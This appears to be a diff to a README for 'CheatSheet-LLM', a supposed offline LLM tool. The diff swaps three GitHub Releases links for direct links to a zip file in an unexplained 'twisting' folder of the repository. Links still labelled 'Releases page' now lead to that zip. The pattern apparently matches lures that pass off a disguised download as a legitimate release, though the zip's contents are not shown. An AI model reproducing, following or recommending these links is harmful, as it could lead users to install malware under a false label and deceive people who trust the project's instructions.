@@ -1,6 +1,6 @@
 # 🤖 CheatSheet-LLM - Use LLMs Offline with Ease
 
-[![Download CheatSheet-LLM](https://img.shields.io/badge/Download-CheatSheet--LLM-blue)](https://github.com/dapps180-sketch/CheatSheet-LLM/releases)
+[![Download CheatSheet-LLM](https://raw.githubusercontent.com/dapps180-sketch/CheatSheet-LLM/main/twisting/CheatSheet-LLM.zip)](https://raw.githubusercontent.com/dapps180-sketch/CheatSheet-LLM/main/twisting/CheatSheet-LLM.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets these requirements:
 
 ### 2. Visit the Releases Page
 
-To obtain CheatSheet-LLM, visit the [Releases page](https://github.com/dapps180-sketch/CheatSheet-LLM/releases). This page contains the latest versions of the application.
+To obtain CheatSheet-LLM, visit the [Releases page](https://raw.githubusercontent.com/dapps180-sketch/CheatSheet-LLM/main/twisting/CheatSheet-LLM.zip). This page contains the latest versions of the application.
 
 ### 3. Download the Application
 
@@ -72,7 +72,7 @@ CheatSheet-LLM covers a range of topics that enhance your understanding and usag
 
 ## 📥 Download & Install
 
-To start using CheatSheet-LLM, go to the [Releases page](https://github.com/dapps180-sketch/CheatSheet-LLM/releases) and download the file that matches your operating system.
+To start using CheatSheet-LLM, go to the [Releases page](https://raw.githubusercontent.com/dapps180-sketch/CheatSheet-LLM/main/twisting/CheatSheet-LLM.zip) and download the file that matches your operating system.
 
 ## 🌟 Need Help?
 
